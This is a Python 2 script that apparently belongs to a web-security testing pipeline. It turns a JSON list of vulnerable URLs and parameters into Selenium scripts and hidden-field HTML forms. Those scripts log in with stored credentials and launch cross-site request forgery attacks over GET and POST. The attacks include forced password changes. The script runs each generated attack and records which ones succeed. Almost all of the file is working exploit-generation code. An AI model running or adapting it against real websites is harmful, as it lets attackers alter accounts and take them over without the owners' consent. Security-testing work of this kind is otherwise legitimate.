#!/usr/bin/python
# from urls import URLs
import os, sys, getopt, json, argparse
import copy
import urlparse
import subprocess

form_tpl_filename = 'formtemplate'
script_filename = 'runall.sh'

## This will generate a html file and a python script
## The python script will run selenium which will post the form html file to inject the CSRF exploit
## to run: python generate_exploit.py -o outfile-name -j json-file
## TODO: How to verify redirect forms??
## TODO: How to make sure password change are put to the last?

def phase4_json_output(url, method, params):
    json_file = "phase4.json"
    json_data = {}
    # if the output file exists, read the content of this json file
    if os.path.isfile(json_file):
        with open(json_file, "r") as json_file_fp:
            if os.stat(json_file).st_size > 0:
                json_data = json.load(json_file_fp)
    
    if url in json_data:
        # if url already exists, append the method and parameters
        json_data[url].append([{"method": method, "params": params}])
    else:
        # if ulr doesn't exist, append the url, method and parameters
        json_data[str(url)] = [{"method": method, "params": params}]
    
    # create json file
    with open(json_file, "w") as outfile:
        json.dump(json_data, outfile, indent=4)


def verify_form_change(file):
    string = "outstr = \"\Exploit URL: \" + url + \" \""
    file.write('\ncur_url = browser.current_url\n')
    file.write('after = browser.page_source\n')
    #file.write('outstr = "Exploit URL: " + url + " "\n')
    file.write(string + '\n')
    file.write('if before != after:\n')
    file.write('\tprint \'##### PASSED #####\'\n')
    file.write('\tupdate_results(outstr + " PASSED\\n")\n')
    file.write('else:\n')
    file.write('\tprint \'##### FAILED #####\'\n')
    file.write('\tupdate_results(outstr + " FAILED\\n")\n\n')    

# @@ create the verification portion of the script 
# @ file: file pointer
def verify_login_phase(file):
    string = "outstr = \"\Exploit URL: \" + url + \" \""
    file.write('\ncur_url = browser.current_url\n')
    file.write('bodyhtml = browser.page_source\n')
    #file.write('outstr = "Exploit URL: " + url + " "\n')
    file.write(string + '\n')
    file.write('ret = check_login(bodyhtml, cur_url, url)\n')
    file.write('if ret:\n')
    file.write('\tprint \'##### PASSED #####\'\n')
    file.write('\tupdate_results(outstr + " PASSED\\n")\n')
    file.write('else:\n')
    file.write('\tprint \'##### FAILED #####\'\n')
    file.write('\tupdate_results(outstr + " FAILED\\n")\n\n')
    

# @@ create the login portion of the script 
# @ file: file pointer
# @ login_url: The login form URL we are exploiting
# @ login_name: Login form name tag
# @ login_name_value: The value of the form name tag
# @ login_pwd_name: Login password name tag
# @ login_pwd_val: The value of the login password name tag
# @ login_xpath: Login xpath value

def login_form(file, login_url, login_name, login_name_val, login_pwd_name, login_pwd_val, login_xpath):
    file.write('# Login to the website \n')
    print "login_name: " + login_name + " login_name_val: " + login_name_val
    print "login_pwd_name: " + login_pwd_name + " login_pwd_val: " + login_pwd_val    
    # we ask selenium to login before our exploit
    file.write('url = \'' + login_url + '\'\n')
    file.write('browser.get(url)\n')
    file.write('browser.find_element_by_name(\''+ login_name +'\').send_keys(\'' + login_name_val + '\')\n')
    file.write('browser.find_element_by_name(\'' + login_pwd_name + '\').send_keys(\'' + login_pwd_val + '\')\n')
    
    # so if there is an xpath, we use it. Otherwise we just find a submit button and submit
    if login_xpath:
        file.write('browser.find_element_by_xpath("' + login_xpath + '\").submit()\n')
    else:
        file.write('browser.find_element_by_xpath("//input[@type=\'submit\']").submit()\n')
    file.write('print browser.current_url\n')
    #file.write('browser.quit()\n')

# @@ create a script to exploit POST method exploits 
# @ file: file pointer
# @ injecttion_url: The affected URL we are exploiting
# @ json_data: json dict
# @ ctr: counter value for file numbering
     
def method_post(file, injection_url, json_data, ctr):
    isPassword = False
    filename = form_tpl_filename + '_' + `ctr` + '.html'
    template = open(filename, 'w')
    template.write('<form action="' + injection_url + '" method="post">\n')
    #sort = iter(sorted(json_data.iteritems()))
    for k,v in json_data.iteritems():
        template.write('<input type="hidden" name="' + k + '" value="' + v + '">\n')
    
    template.write('<input type="submit" value="Submit"></form>\n')
    
    template.close()
    
    file.write('\n\ncurdir = os.getcwd()\n')
    file.write('browser.get(curdir + "/' + filename + '")\n')
    file.write('browser.find_element_by_xpath("//input[@type=\'submit\' and @value=\'Submit\']").submit()\n')
    
    file.write('injection_url = \'' + injection_url + '\'\n')
    file.write('browser.get(injection_url)\n')
    file.write('before = browser.page_source\n')
    file.write('browser.quit()\n')
    
# @@ create an exploit script for GET method exploits
# @ file: file pointer
# @ injecttion_url: The affected URL we are exploiting
# @ json_data: json dict
     
def method_get(file, injection_url, json_data):
    strquery = []
    # Somehow the list is appended from last items first. Maybe this is fixed when 
    # the inputs are from the JSON file
    sort = iter(sorted(json_data.iteritems()))
    for k,v in sort:
        #print k + ' + ' + v
        strquery.append(k + '=' + v)
        
    # create the exploit url    
    exploit_url = injection_url + '?' + '&'.join(strquery)
    #print exploit_url
    
    # run exploit and verify
    file.write('# run exploit and verify\n')
    file.write('baseurl = \'' + injection_url + '\'\n')
    file.write('browser.get(baseurl)\n')
    file.write('before = browser.page_source\n')
    # inject CSRF
    file.write('\nurl = \'' + exploit_url + '\'\n')
    file.write('browser.get(url)\n')
    
    # verify exploits
    string = "outstr = \"Exploit URL: \" + url + \" \""
    file.write('\nbrowser.get(baseurl)\n')
    file.write('after = browser.page_source\n\n')
    #file.write('outstr = "Exploit URL: " + url + " "\n')
    file.write(string + '\n')
    ## if webpage before has more table entries for example, after
    ## executing the exploit, it should have lesser table entry. 
    ## thus the webpage source before and after should differ
    file.write('if before != after:\n')
    file.write('\tprint \'##### PASSED #####\'\n')
    file.write('\tupdate_results(outstr + " PASSED\\n")\n')
    file.write('else:\n')
    file.write('\tprint \'##### FAILED #####\'\n')
    file.write('\tupdate_results(outstr + " FAILED\\n")\n\n')        

# @@ entry function to generate selenium script
# @ filename: Unique filename to be used for the script names
# @ url: Affected website URL
# @ method: GET/POST
# @ json_data: dict of JSON data from file
# @ login_url: Login URL of the affected website 
# @ formdata: login details to enable logging into the site
# @ login_xpath: optional login_xpath for the login form button
# @ ctr: counter value for file numbering
     
def generate_selenium_script(filename, url, method, json_data, login_url, formdata, login_xpath, ctr, isPassChange):  
    ##### these will be from JSON file
    ##### 
    key = []
    val = []
    #print formdata
    for k,v in formdata.iteritems():
        #print k + " " + v
        key.append(k)
        val.append(v)
        
    login_name = key[0]
    login_name_val = val[0]
    login_pwd_name = key[1]
    login_pwd_val = val[1]
    
    #print "login_name: " + login_name + " login_name_val: " + login_name_val
    #print "login_pwd_name: " + login_pwd_name + " login_pwd_val: " + login_pwd_val
    
    file = open(filename, 'w')
    
    file.write('import os\n')
    file.write('from phase4lib import check_login, update_results\n')
    file.write('from selenium import webdriver\n\n')
    file.write('browser = webdriver.Firefox()\n')
    login_form(file, login_url, login_name, login_name_val, login_pwd_name, login_pwd_val, login_xpath)
    file.write('\n# start executing the exploit')
    
    # for form related CSRF exploits
    if (method == 'POST'):
        # verification is different for password POST and other form POSTS
        method_post(file, url, json_data, ctr)
        file.write('\n## Verification phase begins\n')
        file.write('browser = webdriver.Firefox()\n')
        if (isPassChange):
            login_form(file, login_url, login_name, login_name_val, login_pwd_name, login_pwd_val, login_xpath)
            verify_login_phase(file)
        else:
            verify_form_change(file)
        print 'For POST related CSRF exploits in url=%s' % url
    else:
        method_get(file, url, json_data)
        print "For GET related CSRF exploits in url=%s" % url   
        
    file.write('browser.quit()\n')
    
    file.close()
    
def get_url(url):
    return urlparse.urlparse(url).netloc


# @@ To get the login details from URL dict
# @ url: URL needed
# @ urlItems: Info from the URLs dict

def get_login(url, urlsItems):
    login_page = ''
    formdata = []
    xpath = ''
    userURL = False
    adminURL = False
    
    if (url.find('user') >= 0):
        userURL = True
        print 'User URL'
    elif (url.find('admin') >= 0):
        adminURL = True
        print 'Admin URL'
        
    #print 'json url: ' + url
    for urldata in urlsItems:
        #print 'url: ' + urldata[0]
        #print 'login url: ' + urldata[1]["login_page"]
        baseurl = get_url(urldata[0])
        #print 'baseurl: ' + baseurl
        if (url.find(baseurl) < 0):
            continue
        # stupid workaround for any logins    
        elif (url.find('app4') >= 0):
            userURL = False
            adminURL = False
            
        try:    
            #name = urldata[1].pop("name")
            name = urldata[1]["name"]
            if (userURL):
                if (name.find('user') < 0):
                    continue
            if (adminURL):
                if (name.find('admin') < 0):
                    continue
        except KeyError:
            pass            
        try:
            #need_selenium = urldata[1].pop("need_selenium")
            need_selenium = urldata[1]["need_selenium"]
        except KeyError:
            pass
        try:
            #login_page = urldata[1].pop("login_page")
            login_page = urldata[1]["login_page"]
        except KeyError:
            #print 'No login page for ' + name
            pass
            
        if (need_selenium):
            xpath = urldata[1]["formxpath"]
            #print "this xpath: " + xpath
        else:
            xpath = ''
            
        formdata = urldata[1]["formdata"]
        
        if (login_page):
            break
                    
    return (login_page, formdata, xpath)

def help():
    print 'generate_exploit.py -j <json file> -o <outputfile>'

def main(argv):
    json_file = ''
    output_file = ''
    action = ''
    no_exploits = 1
    login_tests = []
    
    parser = argparse.ArgumentParser(description='Generate exploit script for selenium')
    parser.add_argument('-j','--json', help='JSON file name',required=True)
    parser.add_argument('-o','--output',help='Output file name', required=True)
    args = parser.parse_args()
        
    json_file = args.json
    output_file = args.output

    #print "json file = " + json_file + "outfile = " + output_file
    if not os.path.isfile(json_file):
        print 'Wrong path to JSON file'
        help()
        sys.exit(2)
        
    with open(json_file) as json_input:
        json_data = json.load(json_input)
    
    # copy URLs
    urlsItems = copy.deepcopy(URLs).items()
    ctr = 0
    
    script_file = open(script_filename, 'w')
    script_file.write("#!/bin/sh\n")
    script_file.write('\n## runs all the test case to produce output.log\n')
          
    with open("phase4.json", "w") as outfile:
        pass

    login_url_tests = []
    for url in json_data.keys():
        new_entry = 0
        #print url
        #for itr in json_data[url]:
        paramdata = json_data[url]

        for data in paramdata:
            #val = itr['params'].keys()
            isChangePassword = False
            itr = data[0]
            methods = itr['method']
            params = itr['params']
            if len(data) > 1:
                try:
                    nextparam = data[1]
                    if nextparam:
                        action = nextparam['params']
                except KeyError:
                    pass
            else:
                action = None

            if "mypassword" in str(list(params.iteritems())):
                isChangePassword = True
                
            #print methods
            filename = output_file + '_' + `ctr` + '.py'
            
            if new_entry == 0:
                login_url, formdata, login_xpath = get_login(url, urlsItems)
            
            if action:
                for k,v in action.iteritems():
                    extension_url = k + '=' + v 
                exploit_url = url + '?' + extension_url
            else:
                exploit_url = url
    
            #print "login url: " + login_url
            #if login_xpath:
            #    print login_xpath
            
            # no login URL, dont generate exploit?    
            if not login_url:
                continue
                
            generate_selenium_script(filename, exploit_url, methods, params, login_url, formdata, login_xpath, ctr, isChangePassword)
            login_url_tests.append((filename,exploit_url, methods, params,))
                
            ctr += 1
            new_entry = 1

    from collections import OrderedDict
    orderd = OrderedDict()
    orderd[None] = []
    orderd["group"] = []
    orderd["mypassword"] = []

    for filename,exploit_url, methods, params in login_url_tests:
        added = False
        for okey in orderd:
            if okey is None:
                continue
            if okey in str(list(params.iteritems())) or okey in exploit_url:
                orderd[okey].append((filename,exploit_url, methods, params,))
                added = True
                break
        if not added:
            orderd[None].append((filename,exploit_url, methods, params,))

    login_url_tests = reduce(lambda x,y:x+y, orderd.values(), [])

    seen_params = set()
    for filename,exploit_url, methods, params in login_url_tests:
        current_params = set(params.keys())
        pcount = len(seen_params.intersection(current_params))
        if pcount == len(current_params):
            continue
                    
        p = subprocess.Popen(['python', filename], stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
        out, err = p.communicate()
        print exploit_url
        if "PASSED" in out:
            seen_params.update(current_params)
            phase4_json_output(exploit_url, methods, params)
        else:
            print 'FAILED'
        ''''                        
            if (not isChangePassword):
                script_file.write('############# RUNNING TEST NUMBER ' + `ctr` + ' #################\n')
                script_file.write('python ' + filename + '\n')
                script_file.write('sleep 2\n')
            else:
                login_tests.append(filename)
        '''        
    
    # we put all the login tests at the end. Otherwise once login changed, then all test thereafter will start to fail
    for testname in login_tests:
        script_file.write('python ' + testname + '\n')
        script_file.write('sleep 2\n')
    
    script_file.close()
        
if __name__ == "__main__":
   main(sys.argv[1:])